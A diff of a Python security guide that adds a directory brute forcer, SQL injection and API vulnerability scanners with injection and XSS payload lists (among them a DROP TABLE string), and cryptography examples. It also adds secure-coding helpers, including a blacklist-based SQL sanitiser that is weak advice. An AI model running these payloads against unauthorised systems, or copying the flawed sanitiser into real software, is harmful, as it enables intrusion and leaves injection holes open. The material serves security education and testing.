-Stop-Service -Name "suspicious_service" -Force
+### Web Reconnaissance
+
+#### Directory Brute Forcer
+```python
+import requests
+import threading
+from urllib.parse import urljoin
+import sys
+
+class DirectoryBruteForcer:
+    def __init__(self, target_url, wordlist_file):
+        self.target_url = target_url
+        self.wordlist_file = wordlist_file
+        self.found_directories = []
+        self.found_files = []
+    
+    def load_wordlist(self):
+        """Load wordlist from file"""
+        try:
+            with open(self.wordlist_file, 'r') as f:
+                return [line.strip() for line in f.readlines()]
+        except FileNotFoundError:
+            print(f"Wordlist file {self.wordlist_file} not found")
+            return []
+    
+    def test_directory(self, directory):
+        """Test if directory exists"""
+        url = urljoin(self.target_url, directory)
+        try:
+            response = requests.get(url, timeout=5, allow_redirects=False)
+            if response.status_code == 200:
+                self.found_directories.append(url)
+                print(f"[FOUND] Directory: {url}")
+            elif response.status_code == 403:
+                print(f"[FORBIDDEN] Directory: {url}")
+        except requests.exceptions.RequestException:
+            pass  # Connection error, skip
+    
+    def test_file(self, filename):
+        """Test if file exists"""
+        url = urljoin(self.target_url, filename)
+        try:
+            response = requests.head(url, timeout=5)
+            if response.status_code == 200:
+                self.found_files.append(url)
+                print(f"[FOUND] File: {url}")
+        except requests.exceptions.RequestException:
+            pass
+    
+    def brute_force(self, num_threads=50):
+        """Multi-threaded brute force"""
+        wordlist = self.load_wordlist()
+        if not wordlist:
+            return
+        
+        def worker():
+            while True:
+                word = q.get()
+                if word is None:
+                    break
+                
+                # Test as directory
+                self.test_directory(word + '/')
+                
+                # Test common file extensions
+                extensions = ['.php', '.html', '.txt', '.js', '.css', '.xml', '.json']
+                for ext in extensions:
+                    self.test_file(word + ext)
+                
+                q.task_done()
+        
+        import queue
+        q = queue.Queue()
+        
+        # Start worker threads
+        threads = []
+        for i in range(num_threads):
+            t = threading.Thread(target=worker)
+            t.start()
+            threads.append(t)
+        
+        # Add words to queue
+        for word in wordlist:
+            q.put(word)
+        
+        # Wait for completion
+        q.join()
+        
+        # Stop worker threads
+        for i in range(num_threads):
+            q.put(None)
+        for t in threads:
+            t.join()
+        
+        print(f"\nScan completed!")
+        print(f"Found {len(self.found_directories)} directories")
+        print(f"Found {len(self.found_files)} files")
+
+# Usage
+brute_forcer = DirectoryBruteForcer("http://example.com", "wordlist.txt")
+brute_forcer.brute_force()
+```
+
+#### SQL Injection Scanner
+```python
+import requests
+import urllib.parse
+from bs4 import BeautifulSoup
+
+class SQLiScanner:
+    def __init__(self, target_url):
+        self.target_url = target_url
+        self.session = requests.Session()
+        
+        # Common SQL injection payloads
+        self.payloads = [
+            "'",
+            "\"",
+            "' OR '1'='1",
+            "\" OR \"1\"=\"1",
+            "' OR '1'='1' --",
+            "\" OR \"1\"=\"1\" --",
+            "' UNION SELECT NULL--",
+            "\" UNION SELECT NULL--",
+            "'; DROP TABLE users; --",
+            "\"; DROP TABLE users; --"
+        ]
+        
+        # Error patterns that indicate SQL injection
+        self.error_patterns = [
+            "mysql_fetch_array",
+            "ORA-01756",
+            "Microsoft OLE DB Provider",
+            "SQLServer JDBC Driver",
+            "PostgreSQL query failed",
+            "Warning: mysql_",
+            "MySQLSyntaxErrorException",
+            "valid MySQL result",
+            "check the manual that corresponds to your MySQL",
+            "ORA-00933",
+            "ORA-00921"
+        ]
+    
+    def get_forms(self, url):
+        """Extract all forms from a webpage"""
+        try:
+            response = self.session.get(url)
+            soup = BeautifulSoup(response.content, 'html.parser')
+            return soup.find_all('form')
+        except Exception as e:
+            print(f"Error getting forms: {e}")
+            return []
+    
+    def get_form_details(self, form):
+        """Extract form details"""
+        details = {}
+        action = form.attrs.get("action", "").lower()
+        method = form.attrs.get("method", "get").lower()
+        inputs = []
+        
+        for input_tag in form.find_all("input"):
+            input_type = input_tag.attrs.get("type", "text")
+            input_name = input_tag.attrs.get("name")
+            inputs.append({"type": input_type, "name": input_name})
+        
+        details["action"] = action
+        details["method"] = method
+        details["inputs"] = inputs
+        return details
+    
+    def test_sqli(self, form_details, url):
+        """Test form for SQL injection vulnerability"""
+        target_url = urllib.parse.urljoin(url, form_details["action"])
+        
+        for payload in self.payloads:
+            data = {}
+            for input_field in form_details["inputs"]:
+                if input_field["type"] == "text" or input_field["type"] == "search":
+                    data[input_field["name"]] = payload
+                elif input_field["type"] == "email":
+                    data[input_field["name"]] = f"test{payload}@test.com"
+                else:
+                    data[input_field["name"]] = "test"
+            
+            try:
+                if form_details["method"] == "post":
+                    response = self.session.post(target_url, data=data)
+                else:
+                    response = self.session.get(target_url, params=data)
+                
+                # Check for SQL error patterns
+                for pattern in self.error_patterns:
+                    if pattern.lower() in response.text.lower():
+                        print(f"[VULNERABLE] SQL Injection found!")
+                        print(f"URL: {target_url}")
+                        print(f"Payload: {payload}")
+                        print(f"Error pattern: {pattern}")
+                        return True
+                        
+            except Exception as e:
+                print(f"Error testing payload {payload}: {e}")
+        
+        return False
+    
+    def scan(self):
+        """Scan target URL for SQL injection vulnerabilities"""
+        print(f"Scanning {self.target_url} for SQL injection...")
+        
+        forms = self.get_forms(self.target_url)
+        print(f"Found {len(forms)} forms to test")
+        
+        vulnerable_forms = 0
+        for form in forms:
+            form_details = self.get_form_details(form)
+            if self.test_sqli(form_details, self.target_url):
+                vulnerable_forms += 1
+        
+        print(f"Scan completed. Found {vulnerable_forms} vulnerable forms.")
+
+# Usage
+scanner = SQLiScanner("http://testphp.vulnweb.com/listproducts.php")
+scanner.scan()
+```
+
+---
+
+## Cryptography & Hashing
+
+### Encryption and Decryption
+
+#### AES Encryption Implementation
+```python
+from Crypto.Cipher import AES
+from Crypto.Random import get_random_bytes
+from Crypto.Protocol.KDF import PBKDF2
+from Crypto.Hash import SHA256
+import base64
+import hashlib
+
+class AESCrypto:
+    def __init__(self, password):
+        self.password = password.encode('utf-8')
+    
+    def derive_key(self, salt, password):
+        """Derive encryption key from password using PBKDF2"""
+        return PBKDF2(password, salt, 32, count=100000, hmac_hash_module=SHA256)
+    
+    def encrypt(self, plaintext):
+        """Encrypt plaintext using AES"""
+        # Generate random salt and IV
+        salt = get_random_bytes(16)
+        iv = get_random_bytes(16)
+        
+        # Derive key from password
+        key = self.derive_key(salt, self.password)
+        
+        # Pad plaintext to multiple of 16 bytes
+        padded_plaintext = self._pad(plaintext)
+        
+        # Encrypt
+        cipher = AES.new(key, AES.MODE_CBC, iv)
+        ciphertext = cipher.encrypt(padded_plaintext.encode('utf-8'))
+        
+        # Combine salt + iv + ciphertext
+        encrypted_data = salt + iv + ciphertext
+        
+        return base64.b64encode(encrypted_data).decode('utf-8')
+    
+    def decrypt(self, encrypted_data):
+        """Decrypt ciphertext using AES"""
+        try:
+            # Decode base64
+            encrypted_data = base64.b64decode(encrypted_data)
+            
+            # Extract salt, IV, and ciphertext
+            salt = encrypted_data[:16]
+            iv = encrypted_data[16:32]
+            ciphertext = encrypted_data[32:]
+            
+            # Derive key from password
+            key = self.derive_key(salt, self.password)
+            
+            # Decrypt
+            cipher = AES.new(key, AES.MODE_CBC, iv)
+            decrypted_data = cipher.decrypt(ciphertext)
+            
+            # Remove padding and decode
+            return self._unpad(decrypted_data.decode('utf-8'))
+        
+        except Exception as e:
+            raise Exception(f"Decryption failed: {e}")
+    
+    def _pad(self, text):
+        """Add PKCS7 padding"""
+        pad_length = 16 - (len(text) % 16)
+        return text + (chr(pad_length) * pad_length)
+    
+    def _unpad(self, text):
+        """Remove PKCS7 padding"""
+        pad_length = ord(text[-1])
+        return text[:-pad_length]
+
+# Hash functions for password security
+class SecureHashing:
+    @staticmethod
+    def hash_password(password, salt=None):
+        """Hash password with salt using SHA-256"""
+        if salt is None:
+            salt = get_random_bytes(32)
+        
+        pwdhash = hashlib.pbkdf2_hmac('sha256', 
+                                     password.encode('utf-8'), 
+                                     salt, 
+                                     100000)
+        return {
+            'hash': pwdhash,
+            'salt': salt
+        }
+    
+    @staticmethod
+    def verify_password(password, hash_data):
+        """Verify password against stored hash"""
+        new_hash = hashlib.pbkdf2_hmac('sha256',
+                                      password.encode('utf-8'),
+                                      hash_data['salt'],
+                                      100000)
+        return new_hash == hash_data['hash']
+    
+    @staticmethod
+    def file_hash(filename, algorithm='sha256'):
+        """Calculate hash of a file"""
+        hash_obj = hashlib.new(algorithm)
+        with open(filename, 'rb') as f:
+            for chunk in iter(lambda: f.read(4096), b""):
+                hash_obj.update(chunk)
+        return hash_obj.hexdigest()
+
+# Usage examples
+crypto = AESCrypto("my_secret_password")
+encrypted = crypto.encrypt("This is sensitive data")
+print(f"Encrypted: {encrypted}")
+
+decrypted = crypto.decrypt(encrypted)
+print(f"Decrypted: {decrypted}")
+
+# Password hashing
+hasher = SecureHashing()
+password_data = hasher.hash_password("user_password")
+is_valid = hasher.verify_password("user_password", password_data)
+print(f"Password valid: {is_valid}")
+```
+
+### Digital Signatures and Certificates
+
+#### RSA Digital Signatures
+```python
+from Crypto.PublicKey import RSA
+from Crypto.Signature import pkcs1_15
+from Crypto.Hash import SHA256
+import base64
+
+class DigitalSignature:
+    def __init__(self):
+        self.private_key = None
+        self.public_key = None
+    
+    def generate_keys(self, key_size=2048):
+        """Generate RSA key pair"""
+        key = RSA.generate(key_size)
+        self.private_key = key
+        self.public_key = key.publickey()
+        return {
+            'private_key': key.export_key().decode('utf-8'),
+            'public_key': key.publickey().export_key().decode('utf-8')
+        }
+    
+    def load_keys(self, private_key_pem=None, public_key_pem=None):
+        """Load keys from PEM format"""
+        if private_key_pem:
+            self.private_key = RSA.import_key(private_key_pem)
+        if public_key_pem:
+            self.public_key = RSA.import_key(public_key_pem)
+    
+    def sign_message(self, message):
+        """Sign a message with private key"""
+        if not self.private_key:
+            raise Exception("Private key not loaded")
+        
+        message_hash = SHA256.new(message.encode('utf-8'))
+        signature = pkcs1_15.new(self.private_key).sign(message_hash)
+        return base64.b64encode(signature).decode('utf-8')
+    
+    def verify_signature(self, message, signature):
+        """Verify signature with public key"""
+        if not self.public_key:
+            raise Exception("Public key not loaded")
+        
+        try:
+            message_hash = SHA256.new(message.encode('utf-8'))
+            signature_bytes = base64.b64decode(signature)
+            pkcs1_15.new(self.public_key).verify(message_hash, signature_bytes)
+            return True
+        except:
+            return False
+
+# Usage
+ds = DigitalSignature()
+keys = ds.generate_keys()
+
+message = "This is a secure message"
+signature = ds.sign_message(message)
+print(f"Signature: {signature}")
+
+is_valid = ds.verify_signature(message, signature)
+print(f"Signature valid: {is_valid}")
+```
+
+---
+
+## API Security Testing
+
+### REST API Security Scanner
+
+```python
+import requests
+import json
+import urllib.parse
+from datetime import datetime
+
+class APISecurityScanner:
+    def __init__(self, base_url, headers=None):
+        self.base_url = base_url
+        self.session = requests.Session()
+        if headers:
+            self.session.headers.update(headers)
+        
+        # Common API vulnerabilities to test
+        self.tests = [
+            self.test_authentication_bypass,
+            self.test_authorization_bypass,
+            self.test_sql_injection,
+            self.test_nosql_injection,
+            self.test_xss,
+            self.test_xxe,
+            self.test_directory_traversal,
+            self.test_rate_limiting,
+            self.test_information_disclosure
+        ]
+    
+    def test_authentication_bypass(self, endpoint):
+        """Test for authentication bypass vulnerabilities"""
+        vulnerabilities = []
+        
+        # Test with no authentication
+        response = requests.get(f"{self.base_url}{endpoint}")
+        if response.status_code == 200:
+            vulnerabilities.append({
+                'type': 'Authentication Bypass',
+                'description': 'Endpoint accessible without authentication',
+                'endpoint': endpoint
+            })
+        
+        # Test with invalid tokens
+        invalid_tokens = ['invalid_token', 'null', '', 'admin', '123456']
+        for token in invalid_tokens:
+            headers = {'Authorization': f'Bearer {token}'}
+            response = requests.get(f"{self.base_url}{endpoint}", headers=headers)
+            if response.status_code == 200:
+                vulnerabilities.append({
+                    'type': 'Authentication Bypass',
+                    'description': f'Endpoint accessible with invalid token: {token}',
+                    'endpoint': endpoint
+                })
+        
+        return vulnerabilities
+    
+    def test_authorization_bypass(self, endpoint):
+        """Test for authorization bypass (IDOR)"""
+        vulnerabilities = []
+        
+        # Test parameter manipulation
+        if '/' in endpoint:
+            parts = endpoint.split('/')
+            for i, part in enumerate(parts):
+                if part.isdigit():
+                    # Test with different user IDs
+                    for test_id in ['1', '2', '999', '0', '-1']:
+                        test_endpoint = '/'.join(parts[:i] + [test_id] + parts[i+1:])
+                        response = self.session.get(f"{self.base_url}{test_endpoint}")
+                        if response.status_code == 200:
+                            vulnerabilities.append({
+                                'type': 'IDOR',
+                                'description': f'Possible IDOR vulnerability with ID: {test_id}',
+                                'endpoint': test_endpoint
+                            })
+        
+        return vulnerabilities
+    
+    def test_sql_injection(self, endpoint):
+        """Test for SQL injection vulnerabilities"""
+        vulnerabilities = []
+        
+        sql_payloads = [
+            "' OR '1'='1",
+            "'; DROP TABLE users; --",
+            "' UNION SELECT NULL, username, password FROM users --",
+            "1' AND SLEEP(5) --"
+        ]
+        
+        for payload in sql_payloads:
+            # Test in URL parameters
+            test_url = f"{self.base_url}{endpoint}?id={urllib.parse.quote(payload)}"
+            response = requests.get(test_url)
+            
+            if self._check_sql_errors(response.text):
+                vulnerabilities.append({
+                    'type': 'SQL Injection',
+                    'description': f'SQL injection vulnerability detected with payload: {payload}',
+                    'endpoint': endpoint
+                })
+        
+        return vulnerabilities
+    
+    def test_nosql_injection(self, endpoint):
+        """Test for NoSQL injection vulnerabilities"""
+        vulnerabilities = []
+        
+        nosql_payloads = [
+            {"$ne": ""},
+            {"$regex": ".*"},
+            {"$where": "this.username == this.password"},
+            {"username": {"$ne": ""}, "password": {"$ne": ""}}
+        ]
+        
+        for payload in nosql_payloads:
+            try:
+                response = self.session.post(
+                    f"{self.base_url}{endpoint}",
+                    json=payload,
+                    headers={'Content-Type': 'application/json'}
+                )
+                
+                if response.status_code == 200 and len(response.text) > 100:
+                    vulnerabilities.append({
+                        'type': 'NoSQL Injection',
+                        'description': f'Possible NoSQL injection with payload: {payload}',
+                        'endpoint': endpoint
+                    })
+            except:
+                pass
+        
+        return vulnerabilities
+    
+    def test_xss(self, endpoint):
+        """Test for XSS vulnerabilities"""
+        vulnerabilities = []
+        
+        xss_payloads = [
+            "<script>alert('XSS')</script>",
+            "javascript:alert('XSS')",
+            "<img src=x onerror=alert('XSS')>",
+            "'><script>alert('XSS')</script>"
+        ]
+        
+        for payload in xss_payloads:
+            # Test in parameters
+            test_url = f"{self.base_url}{endpoint}?q={urllib.parse.quote(payload)}"
+            response = requests.get(test_url)
+            
+            if payload in response.text:
+                vulnerabilities.append({
+                    'type': 'XSS',
+                    'description': f'XSS vulnerability detected with payload: {payload}',
+                    'endpoint': endpoint
+                })
+        
+        return vulnerabilities
+    
+    def test_rate_limiting(self, endpoint):
+        """Test for rate limiting implementation"""
+        vulnerabilities = []
+        
+        # Send multiple requests rapidly
+        responses = []
+        for i in range(50):
+            response = self.session.get(f"{self.base_url}{endpoint}")
+            responses.append(response.status_code)
+        
+        # Check if any rate limiting is in place
+        rate_limited = any(code in [429, 503] for code in responses)
+        if not rate_limited:
+            vulnerabilities.append({
+                'type': 'Missing Rate Limiting',
+                'description': 'No rate limiting detected on endpoint',
+                'endpoint': endpoint
+            })
+        
+        return vulnerabilities
+    
+    def _check_sql_errors(self, response_text):
+        """Check for SQL error patterns in response"""
+        sql_errors = [
+            "mysql_fetch_array",
+            "ORA-01756",
+            "Microsoft OLE DB Provider",
+            "SQLServer JDBC Driver",
+            "PostgreSQL query failed"
+        ]
+        
+        return any(error.lower() in response_text.lower() for error in sql_errors)
+    
+    def scan_endpoint(self, endpoint):
+        """Run all security tests on an endpoint"""
+        print(f"Scanning endpoint: {endpoint}")
+        all_vulnerabilities = []
+        
+        for test in self.tests:
+            try:
+                vulnerabilities = test(endpoint)
+                all_vulnerabilities.extend(vulnerabilities)
+            except Exception as e:
+                print(f"Error running test {test.__name__}: {e}")
+        
+        return all_vulnerabilities
+    
+    def generate_report(self, vulnerabilities):
+        """Generate security scan report"""
+        report = {
+            'scan_date': datetime.now().isoformat(),
+            'target': self.base_url,
+            'total_vulnerabilities': len(vulnerabilities),
+            'vulnerabilities': vulnerabilities
+        }
+        
+        return json.dumps(report, indent=2)
+
+# Usage
+scanner = APISecurityScanner("https://api.example.com")
+vulns = scanner.scan_endpoint("/api/v1/users/123")
+report = scanner.generate_report(vulns)
+print(report)
+```
+
+---
+
+## Best Practices
+
+### Secure Coding Guidelines
+
+#### Input Validation and Sanitization
+```python
+import re
+import html
+import urllib.parse
+
+class InputValidator:
+    @staticmethod
+    def validate_email(email):
+        """Validate email format"""
+        pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
+        return re.match(pattern, email) is not None
+    
+    @staticmethod
+    def validate_ip(ip):
+        """Validate IP address"""
+        pattern = r'^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
+        return re.match(pattern, ip) is not None
+    
+    @staticmethod
+    def validate_url(url):
+        """Validate URL format"""
+        pattern = r'^https?://(?:[-\w.])+(?:\:[0-9]+)?(?:/(?:[\w/_.])*(?:\?(?:[\w&=%.])*)?(?:\#(?:[\w.])*)?)?$'
+        return re.match(pattern, url) is not None
+    
+    @staticmethod
+    def sanitize_html(text):
+        """Sanitize HTML to prevent XSS"""
+        return html.escape(text)
+    
+    @staticmethod
+    def sanitize_sql(text):
+        """Basic SQL injection prevention"""
+        dangerous_chars = ["'", '"', ';', '--', '/*', '*/', 'xp_', 'sp_']
+        for char in dangerous_chars:
+            text = text.replace(char, '')
+        return text
+    
+    @staticmethod
+    def validate_filename(filename):
+        """Validate filename to prevent directory traversal"""
+        # Remove path traversal attempts
+        filename = filename.replace('..', '')
+        filename = filename.replace('/', '')
+        filename = filename.replace('\\', '')
+        
+        # Check for dangerous extensions
+        dangerous_extensions = ['.exe', '.bat', '.cmd', '.com', '.pif', '.scr', '.vbs', '.js']
+        for ext in dangerous_extensions:
+            if filename.lower().endswith(ext):
+                return False
+        
+        return True
+
+# Error handling and logging
+import logging
+import traceback
+
+class SecurityLogger:
+    def __init__(self, log_file="security.log"):
+        logging.basicConfig(
+            filename=log_file,
+            level=logging.INFO,
+            format='%(asctime)s - %(levelname)s - %(message)s'
+        )
+        self.logger = logging.getLogger(__name__)
+    
+    def log_security_event(self, event_type, details):
+        """Log security-related events"""
+        self.logger.warning(f"SECURITY EVENT - {event_type}: {details}")
+    
+    def log_error(self, error, context=""):
+        """Log errors with context"""
+        self.logger.error(f"ERROR - {context}: {str(error)}")
+        self.logger.error(f"TRACEBACK: {traceback.format_exc()}")
+    
+    def log_access_attempt(self, user, resource, success):
+        """Log access attempts"""
+        status = "SUCCESS" if success else "FAILED"
+        self.logger.info(f"ACCESS ATTEMPT - User: {user}, Resource: {resource}, Status: {status}")
+
+# Secure configuration management
+class SecureConfig:
+    def __init__(self):
+        self.config = {}
+    
+    def load_from_env(self, key, default=None, required=False):
+        """Load configuration from environment variables"""
+        import os
+        value = os.getenv(key, default)
+        if required and value is None:
+            raise ValueError(f"Required configuration {key} not found")
+        return value
+    
+    def load_from_file(self, config_file):
+        """Load configuration from encrypted file"""
+        try:
+            with open(config_file, 'r') as f:
+                # In production, decrypt the file content
+                self.config = json.load(f)
+        except Exception as e:
+            raise Exception(f"Failed to load configuration: {e}")
+    
+    def get(self, key, default=None):
+        """Get configuration value"""
+        return self.config.get(key, default)
+    
+    def mask_sensitive_data(self, data):
+        """Mask sensitive data for logging"""
+        sensitive_keys = ['password', 'token', 'key', 'secret']
+        if isinstance(data, dict):
+            masked = {}
+            for k, v in data.items():
+                if any(sensitive in k.lower() for sensitive in sensitive_keys):
+                    masked[k] = '*' * len(str(v))
+                else:
+                    masked[k] = v
+            return masked
+        return data
+
+# Usage examples
+validator = InputValidator()
+logger = SecurityLogger()
+config = SecureConfig()
+
+# Validate input
+email = "test@example.com"
+if validator.validate_email(email):
+    logger.log_access_attempt("user", "email_validation", True)
+else:
+    logger.log_security_event("INVALID_EMAIL", f"Invalid email attempt: {email}")
 ```
 
 ---
 
 ## Resources
 
-### Official Documentation
-- [Microsoft Security Compliance Toolkit](https://www.microsoft.com/en-us/download/details.aspx?id=55319)
-- [Windows Security Baselines](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-security-baselines)
-- [CIS Controls](https://www.cisecurity.org/controls/)
+### Essential Libraries and Tools
+- **Scapy**: Packet manipulation and network discovery
+- **Nmap-Python**: Network scanning and service detection
+- **Requests**: HTTP library for API testing
+- **BeautifulSoup**: Web scraping and HTML parsing
+- **PyCryptodome**: Cryptographic operations
+- **Paramiko**: SSH client implementation
+- **Volatility3**: Memory forensics framework
+- **YARA-Python**: Malware identification rules
 
-### Security Tools
-- [Sysmon](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon) - System Monitor
-- [Process Monitor](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) - Process and File Monitor
-- [Windows Sysinternals](https://docs.microsoft.com/en-us/sysinternals/) - System utilities
+### Learning Resources
+- [Python for Cybersecurity](https://www.python.org/about/apps/#security)
+- [OWASP Python Security](https://owasp.org/www-project-python-security/)
+- [Black Hat Python Book](https://nostarch.com/blackhatpython)
+- [Violent Python Book](https://www.elsevier.com/books/violent-python/9781597499576)
 
-### Training Resources
-- [Microsoft Security Training](https://docs.microsoft.com/en-us/security/)
-- [SANS Windows Security](https://www.sans.org/courses/windows-security/)
-- [Windows Security Fundamentals](https://docs.microsoft.com/en-us/learn/paths/windows-security-fundamentals/)
+### Security-Focused Python Frameworks
+- **Django Security**: Web application security framework
+- **Flask-Security**: Security extensions for Flask
+- **FastAPI Security**: Modern API security features
+- **Twisted**: Event-driven networking engine
 
 ---
 
 ## Conclusion
 
-Windows security hardening is an ongoing process that requires continuous monitoring, updating, and improvement. This guide provides the foundation for securing Windows systems against modern threats while maintaining operational functionality.
+Python's versatility and extensive library ecosystem make it an ideal language for cybersecurity professionals. This guide provides the foundation for developing security tools, automating tasks, and conducting security assessments using Python.
 
-Remember to:
-- **Test all configurations** in a lab environment first
-- **Document all changes** for compliance and troubleshooting
-- **Monitor systems** continuously for security events
-- **Stay updated** with latest security patches and best practices
+Key takeaways:
+- **Always validate and sanitize input** to prevent injection attacks
+- **Use established cryptographic libraries** rather than implementing your own
+- **Implement proper error handling and logging** for security events
+- **Follow secure coding practices** throughout development
+- **Keep libraries updated** to patch security vulnerabilities
 
 ---
 
-*This guide is for educational and authorized security hardening purposes only. Always follow your organization's policies and procedures.*
+*This guide is for educational and authorized security testing purposes only. Always ensure you have proper authorization before testing any systems.*
 
 [![GitHub](https://img.shields.io/badge/GitHub-gotr00t0day-black?style=for-the-badge&logo=github)](https://github.com/gotr00t0day)
 [![Website](https://img.shields.io/badge/Website-gotr00t0day.github.io-blue?style=for-the-badge&logo=web)](https://gotr00t0day.github.io) 
